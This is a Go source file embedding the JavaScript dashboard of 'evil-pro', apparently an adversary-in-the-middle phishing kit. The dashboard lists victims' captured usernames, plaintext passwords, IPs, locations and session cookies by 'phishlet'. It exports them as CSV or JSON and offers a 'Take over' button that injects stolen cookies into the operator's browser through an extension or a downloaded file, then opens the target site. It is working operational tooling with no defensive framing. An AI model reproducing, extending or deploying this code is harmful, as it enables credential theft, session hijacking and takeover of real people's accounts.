package core

// panelJS is the single-page app served at /static/app.js.
// The Dashboard is intentionally Sessions-only: operators manage phishlets,
// lures, redirects, blacklist and settings from the Control Panel instead, so
// end users get the least possible surface. The full REST API is still served.
// NOTE: no backticks are used inside (Go raw string); string building uses '+' only.
const panelJS = `'use strict';
/* evil-pro dashboard - sessions only */

var $ = function (s, r) { return (r || document).querySelector(s); };
var $$ = function (s, r) { return Array.prototype.slice.call((r || document).querySelectorAll(s)); };
function esc(v) {
  if (v === null || v === undefined) return '';
  return String(v).replace(/[&<>"']/g, function (c) {
    return { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c];
  });
}
function fmtTime(ts) { if (!ts) return '--'; try { return new Date(ts * 1000).toLocaleString(); } catch (e) { return '--'; } }
function ago(ts) {
  if (!ts) return '--';
  var s = Math.floor(Date.now() / 1000) - ts;
  if (s < 60) return s + 's ago';
  if (s < 3600) return Math.floor(s / 60) + 'm ago';
  if (s < 86400) return Math.floor(s / 3600) + 'h ago';
  return Math.floor(s / 86400) + 'd ago';
}
function toast(msg, kind) {
  var el = document.createElement('div');
  el.className = 't ' + (kind || 'info');
  el.textContent = msg;
  $('#toast').appendChild(el);
  setTimeout(function () { el.remove(); }, 3200);
}
function copy(text) {
  if (!text) return;
  navigator.clipboard.writeText(text).then(function () { toast('Copied', 'info'); }, function () { toast('Copy failed', 'err'); });
}

async function api(method, path, body) {
  var opt = { method: method, headers: {} };
  if (body !== undefined) { opt.headers['Content-Type'] = 'application/json'; opt.body = JSON.stringify(body); }
  var r = await fetch(path, opt);
  if (r.status === 401) { location.href = '/login'; throw new Error('unauthorized'); }
  var ct = r.headers.get('content-type') || '';
  var data = ct.indexOf('json') >= 0 ? await r.json() : await r.text();
  if (!r.ok) throw new Error((data && data.error) || ('HTTP ' + r.status));
  return data;
}
var API = {
  get: function (p) { return api('GET', p); },
  post: function (p, b) { return api('POST', p, b || {}); },
  del: function (p) { return api('DELETE', p); }
};

var S = {
  sessions: [], total: 0, stats: null,
  q: { search: '', phishlet: '', tokens: '', sort: 'create_time', dir: 'desc' },
  pageNum: 0, pageSize: 25,
  selected: {}, timer: null, ext: false, cur: null
};

/* ---------------- layout ---------------- */
var ICO = {
  sessions: '<circle cx="9" cy="8" r="3.2"/><path d="M3.5 19c0-3 2.5-5 5.5-5s5.5 2 5.5 5"/><path d="M15 6.5h4M15 10h4M15 13.5h4"/>',
  refresh: '<path d="M20 12a8 8 0 1 1-2.3-5.7"/><path d="M20 4v4h-4"/>',
  theme: '<path d="M12 3v1.5M12 19.5V21M4.2 4.2l1 1M18.8 18.8l1 1M3 12h1.5M19.5 12H21M4.2 19.8l1-1M18.8 5.2l1-1"/><circle cx="12" cy="12" r="3.4"/>',
  logout: '<path d="M15 4h3a2 2 0 0 1 2 2v12a2 2 0 0 1-2 2h-3"/><path d="M10 8l-4 4 4 4M6 12h9"/>',
  csv: '<path d="M14 3H7a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V8z"/><path d="M14 3v5h5"/>',
  menu: '<path d="M4 7h16M4 12h16M4 17h16"/>',
  shield: '<path d="M12 3l7 3v5.2c0 4.3-2.9 8.1-7 9.3-4.1-1.2-7-5-7-9.3V6z"/>'
};
function ico(n, cls) {
  if (!ICO[n]) return '';
  return '<svg class="ic ' + (cls || '') + '" viewBox="0 0 24 24">' + ICO[n] + '</svg>';
}

function renderChrome() {
  var stats = S.stats || { total_sessions: 0, with_tokens: 0, no_tokens: 0, unique_ips: 0, active_sessions: 0 };
  var rate = stats.total_sessions ? Math.round(stats.with_tokens / stats.total_sessions * 100) : 0;
  $('#side').innerHTML =
    '<div class="side-head">' +
      '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><rect width="32" height="32" rx="8" fill="#6366f1"/><path d="M18 6 9 18h5l-1 8 9-12h-5z" fill="#fff"/></svg>' +
      '<div class="side-brand">evil-pro<small>dashboard</small></div>' +
    '</div>' +
    '<nav class="nav">' +
      '<div class="nav-group">Monitor</div>' +
      '<div class="nav-item active">' + ico('sessions') + '<span>Sessions</span><span class="count">' + stats.total_sessions + '</span></div>' +
    '</nav>' +
    '<div class="side-foot">' +
      '<span><span class="dot" id="liveDot"></span> live</span>' +
      '<span class="dim" style="font-family:var(--mono);font-size:10px">' + rate + '% hit</span>' +
    '</div>';

  $('#pageTitle').textContent = 'Sessions';
  $('#pageDesc').textContent = stats.with_tokens + ' with tokens · ' + stats.unique_ips + ' unique IPs · ' + stats.active_sessions + ' active now';
  $('#topActions').innerHTML =
    '<button class="btn sm" data-act="theme" title="Toggle light/dark">' + ico('theme') + '</button>' +
    '<button class="btn sm" data-act="export" data-id="csv">' + ico('csv') + ' CSV</button>' +
    '<button class="btn sm" data-act="export" data-id="json">JSON</button>' +
    '<button class="btn sm" data-act="refresh">' + ico('refresh') + ' Refresh</button>' +
    '<button class="btn sm" data-act="logout">' + ico('logout') + ' Logout</button>';
}

/* ---------------- sessions ---------------- */
async function render() {
  try {
    if (!S.stats) { try { S.stats = await API.get('/api/v1/overview'); } catch (e) {} }
    renderChrome();
    var q = 'limit=' + S.pageSize + '&offset=' + (S.pageNum * S.pageSize) +
      '&search=' + encodeURIComponent(S.q.search) + '&phishlet=' + encodeURIComponent(S.q.phishlet) +
      '&tokens=' + encodeURIComponent(S.q.tokens) + '&sort=' + S.q.sort + '&dir=' + S.q.dir;
    var d = await API.get('/api/v1/sessions?' + q);
    S.sessions = d.sessions; S.total = d.total;
    var pages = Math.max(1, Math.ceil(d.total / S.pageSize));
    var phopts = (d.phishlets || []).map(function (p) { return '<option value="' + esc(p) + '"' + (S.q.phishlet === p ? ' selected' : '') + '>' + esc(p) + '</option>'; }).join('');
    var toks = [['', 'All tokens'], ['yes', 'With tokens'], ['no', 'No tokens']].map(function (t) {
      return '<option value="' + t[0] + '"' + (S.q.tokens === t[0] ? ' selected' : '') + '>' + t[1] + '</option>';
    }).join('');

    $('#content').innerHTML =
      '<div class="toolbar">' +
        '<div class="search grow"><input id="fSearch" placeholder="Search username, password, IP, user-agent…" value="' + esc(S.q.search) + '"></div>' +
        '<select id="fPl" style="width:auto"><option value="">All phishlets</option>' + phopts + '</select>' +
        '<select id="fTok" style="width:auto">' + toks + '</select>' +
        '<span class="dim mono">' + d.total + ' result' + (d.total === 1 ? '' : 's') + '</span>' +
      '</div>' +
      '<div class="card pad0">' + sessionsTable(d.sessions) + '</div>' +
      '<div class="toolbar mt14">' +
        '<div class="bulk"><span class="dim mono" id="selCount">0 selected</span>' +
        '<button class="btn sm danger" data-act="bulk-del" id="bulkBtn" style="display:none">Delete selected</button></div>' +
        '<span class="dim mono" style="margin-left:auto">Page ' + (S.pageNum + 1) + ' / ' + pages + '</span>' +
        '<div class="actions">' +
          '<button class="btn sm" data-act="pg" data-id="prev"' + (S.pageNum <= 0 ? ' disabled' : '') + '>← Prev</button>' +
          '<button class="btn sm" data-act="pg" data-id="next"' + (S.pageNum + 1 >= pages ? ' disabled' : '') + '>Next →</button>' +
        '</div>' +
      '</div>';

    var f = $('#fSearch'); if (f) f.oninput = function () { S.q.search = this.value; S.pageNum = 0; debounce(render, 280); };
    var p = $('#fPl'); if (p) p.onchange = function () { S.q.phishlet = this.value; S.pageNum = 0; render(); };
    var t = $('#fTok'); if (t) t.onchange = function () { S.q.tokens = this.value; S.pageNum = 0; render(); };
  } catch (e) {
    $('#content').innerHTML = '<div class="empty"><div class="big">⚠</div>' + esc(e.message || e) + '</div>';
  }
}
function sessionsTable(list) {
  if (!list.length) return '<div class="empty"><div class="big">◌</div>No sessions yet.</div>';
  var h = '<table><thead><tr>' +
    '<th style="width:34px"><input type="checkbox" id="selAll" data-act="selall"></th>' +
    '<th>ID</th><th>Phishlet</th><th>Username</th><th>Password</th><th>IP</th><th>Location</th><th>Tokens</th><th>Captured</th><th></th>' +
    '</tr></thead><tbody>';
  list.forEach(function (s) {
    var geo = s.geo ? ((s.geo.city ? s.geo.city + ', ' : '') + (s.geo.country || '')) : '';
    h += '<tr class="clickable" data-act="sess" data-id="' + s.id + '">' +
      '<td><input type="checkbox" class="chk" data-act="sel" data-id="' + s.id + '"' + (S.selected[s.id] ? ' checked' : '') + '></td>' +
      '<td class="mono dim">#' + s.id + '</td>' +
      '<td><span class="badge acc">' + esc(s.phishlet) + '</span></td>' +
      '<td class="mono"><span class="copy" data-act="copy" data-copy="' + esc(s.username) + '">' + (esc(s.username) || '<span class="dim">--</span>') + '</span></td>' +
      '<td class="mono">' + (s.password ? '<span class="copy" data-act="copy" data-copy="' + esc(s.password) + '">' + esc(s.password) + '</span>' : '<span class="dim">--</span>') + '</td>' +
      '<td class="mono">' + esc(s.remote_addr) + '</td>' +
      '<td class="trunc">' + esc(geo || '--') + '</td>' +
      '<td>' + (s.has_tokens ? '<span class="badge ok">captured</span>' : '<span class="badge mut">none</span>') + '</td>' +
      '<td class="dim" title="' + esc(fmtTime(s.create_time)) + '">' + ago(s.create_time) + '</td>' +
      '<td class="right"><button class="btn xs" data-act="sess" data-id="' + s.id + '">Open</button></td>' +
      '</tr>';
  });
  return h + '</tbody></table>';
}

/* ---------------- drawer ---------------- */
function openDrawer(title, body, actions) {
  $('#drawerHead').innerHTML = '<h3>' + title + '</h3><div class="actions" style="margin-left:auto">' + (actions || '') + '<button class="btn sm" data-act="drawer-close">✕</button></div>';
  $('#drawerBody').innerHTML = body;
  $('#drawer').classList.add('open'); $('#scrim').classList.add('open');
}
function closeDrawer() { $('#drawer').classList.remove('open'); $('#scrim').classList.remove('open'); }

async function openSession(id) {
  var s = await API.get('/api/v1/sessions/' + id);
  S.cur = s;
  window.postMessage({ type: 'SESSION_SELECT', payload: { sessionId: s.id, phishlet: s.phishlet, hasTokens: s.has_tokens } }, '*');
  var geo = s.geo ? ((s.geo.city ? s.geo.city + ', ' : '') + (s.geo.country || '') + (s.geo.isp ? ' · ' + s.geo.isp : '') + (s.geo.vpn ? ' [VPN]' : '') + (s.geo.datacenter ? ' [DC]' : '')) : '-';
  var tok = s.tokens && Object.keys(s.tokens).length ? JSON.stringify(s.tokens, null, 2) : '(none)';
  var body = '<div class="kv">' +
      row('Username', s.username || '-', s.username) + row('Password', s.password || '-', s.password) +
      row('IP', s.remote_addr || '-') + row('Location', geo) +
      row('Captured', fmtTime(s.create_time)) + row('Landing URL', s.landing_url || '-') +
    '</div>' +
    '<div class="field mt14"><label>User agent</label><div class="pre">' + esc(s.useragent || '-') + '</div></div>' +
    '<div class="field"><label>Cookies ' + (s.has_tokens ? '<span class="badge ok">' + s.token_count + ' captured</span>' : '<span class="badge mut">none</span>') + '</label><div class="pre">' + esc(tok) + '</div></div>';
  openDrawer('Session #' + s.id + ' · ' + esc(s.phishlet), body,
    (s.has_tokens ? '<button class="btn sm primary" data-act="inject" data-id="' + s.id + '">⚡ Take over</button>' : '') +
    '<button class="btn sm" data-act="sess-export" data-id="' + s.id + '">Cookies JSON</button>' +
    '<button class="btn sm danger" data-act="sess-del" data-id="' + s.id + '">Delete</button>');
  function row(k, v, copyv) {
    return '<span class="k">' + esc(k) + '</span><span class="v' + (copyv ? ' copy" data-act="copy" data-copy="' + esc(copyv) : '') + '">' + esc(v) + '</span>';
  }
}

/* ---------------- inject (extension bridge) ---------------- */
document.addEventListener('ext-ready', function () { S.ext = true; });
window.addEventListener('inject-result', function (e) {
  var r = e.detail || {}; var el = $('#injResult');
  if (el) el.innerHTML = '<div class="badge ok">' + (r.success || 0) + ' cookies injected' + (r.failed ? ', ' + r.failed + ' failed' : '') + '</div>';
});
async function inject(id) {
  var d = await API.get('/api/v1/sessions/' + id + '/cookies');
  if (!d.count) { toast('No cookies to inject', 'err'); return; }
  if (S.ext) {
    openModal('⚡ Session takeover',
      '<p class="muted mb14">Injecting <b>' + d.count + '</b> cookies into your browser and opening the target site…</p>' +
      '<div id="injResult"><span class="dim">working…</span></div>' +
      '<div class="actions mt14"><button class="btn sm" data-act="copy" data-copy="' + esc(d.cookie_header) + '">Copy Cookie header</button>' +
      '<button class="btn sm" data-act="dl-cookies" data-id="' + id + '">Download JSON</button></div>');
    window.postMessage({ type: 'DO_INJECT', payload: d }, '*');
  } else {
    downloadCookieFile(d);
    openModal('⚡ Session takeover',
      '<p class="muted mb14">Cookies downloaded (<b>' + d.count + '</b>). Install the <b>Session Injector</b> extension for one-click, or use Cookie-Editor manually.</p>' +
      '<div class="actions"><button class="btn sm primary" data-act="open-target" data-copy="' + esc(d.target_url) + '">Open target site</button>' +
      '<button class="btn sm" data-act="copy" data-copy="' + esc(d.cookie_header) + '">Copy Cookie header</button>' +
      '<button class="btn sm" data-act="dl-cookies" data-id="' + id + '">Download JSON</button></div>');
  }
}
function downloadCookieFile(d) {
  var blob = new Blob([JSON.stringify(d.cookies || [], null, 2)], { type: 'application/json' });
  var a = document.createElement('a');
  a.href = URL.createObjectURL(blob);
  a.download = 'session_' + d.session_id + '_cookies.json';
  a.click();
  URL.revokeObjectURL(a.href);
}

function openModal(title, html) {
  $('#modalBox').innerHTML = '<div class="card-head"><h3>' + title + '</h3><button class="btn sm" data-act="modal-close">✕</button></div><div class="card-body">' + html + '</div>';
  $('#modal').classList.add('open');
}
function closeModal() { $('#modal').classList.remove('open'); }

/* ---------------- actions ---------------- */
function run(fn) { (async function () { try { await fn(); } catch (e) { toast(e.message || String(e), 'err'); } })(); }
var ACTIONS = {
  refresh: function () { S.stats = null; render(); },
  'drawer-close': closeDrawer,
  'modal-close': closeModal,
  theme: function () {
    var c = document.documentElement.getAttribute('data-theme') === 'light' ? 'dark' : 'light';
    document.documentElement.setAttribute('data-theme', c);
    localStorage.setItem('theme', c);
  },
  logout: function () { run(async function () { await API.post('/api/v1/logout'); location.href = '/login'; }); },
  copy: function (id, el) { copy(el.getAttribute('data-copy')); },
  pg: function (id) { S.pageNum += (id === 'next' ? 1 : -1); render(); },
  export: function (id) { window.open('/api/v1/sessions/export?format=' + id); },
  sess: function (id) { run(function () { return openSession(id); }); },
  'sess-del': function (id) { if (confirm('Delete session #' + id + '?')) run(async function () { await API.del('/api/v1/sessions/' + id); toast('Deleted', 'ok'); closeDrawer(); render(); }); },
  'sess-export': function (id) { window.open('/api/v1/sessions/' + id + '/cookies'); },
  inject: function (id) { run(function () { return inject(id); }); },
  'dl-cookies': function (id) { run(async function () { downloadCookieFile(await API.get('/api/v1/sessions/' + id + '/cookies')); }); },
  'open-target': function (id, el) { window.open(el.getAttribute('data-copy'), '_blank'); },
  sel: function (id, el) { S.selected[id] = el.checked; updSel(); },
  selall: function (id, el) {
    S.sessions.forEach(function (s) { if (el.checked) S.selected[s.id] = true; else delete S.selected[s.id]; });
    $$('[data-act=sel]').forEach(function (c) { c.checked = el.checked; });
    updSel();
  },
  'bulk-del': function () {
    var ids = Object.keys(S.selected).filter(function (k) { return S.selected[k]; });
    if (!ids.length) return;
    if (!confirm('Delete ' + ids.length + ' session(s)?')) return;
    run(async function () { await API.post('/api/v1/sessions/delete', { ids: ids.map(Number) }); S.selected = {}; toast('Deleted', 'ok'); render(); });
  }
};
function updSel() {
  var n = Object.keys(S.selected).filter(function (k) { return S.selected[k]; }).length;
  var c = $('#selCount'); if (c) c.textContent = n + ' selected';
  var b = $('#bulkBtn'); if (b) b.style.display = n ? '' : 'none';
}

document.addEventListener('click', function (e) {
  var t = e.target;
  while (t && t !== document && !(t.getAttribute && t.getAttribute('data-act'))) t = t.parentNode;
  if (!t || t === document) return;
  var act = t.getAttribute('data-act');
  if (act === 'sel' || act === 'selall') return; // handled by change
  var fn = ACTIONS[act];
  if (!fn) return;
  e.preventDefault();
  fn(t.getAttribute('data-id'), t);
});
document.addEventListener('change', function (e) {
  var el = e.target;
  if (el && el.getAttribute && (el.getAttribute('data-act') === 'sel' || el.getAttribute('data-act') === 'selall')) {
    ACTIONS[el.getAttribute('data-act')](el.getAttribute('data-id'), el);
  }
});
$('#scrim').addEventListener('click', function () { closeDrawer(); closeModal(); });

var debT = null;
function debounce(fn, ms) { clearTimeout(debT); debT = setTimeout(fn, ms); }

function startTimer() {
  clearInterval(S.timer);
  S.timer = setInterval(function () {
    if (document.hidden) return;
    var ae = document.activeElement;
    if (ae && (ae.tagName === 'INPUT' || ae.tagName === 'SELECT' || ae.tagName === 'TEXTAREA') && $('#content').contains(ae)) return;
    render();
  }, 10000);
}

/* init */
(async function init() {
  try {
    var saved = localStorage.getItem('theme'); if (saved) document.documentElement.setAttribute('data-theme', saved);
    S.stats = await API.get('/api/v1/overview');
    await render();
    startTimer();
  } catch (e) {
    if ((e.message || '').indexOf('unauthorized') < 0) $('#content').innerHTML = '<div class="empty">' + esc(e.message) + '</div>';
  }
})();
`
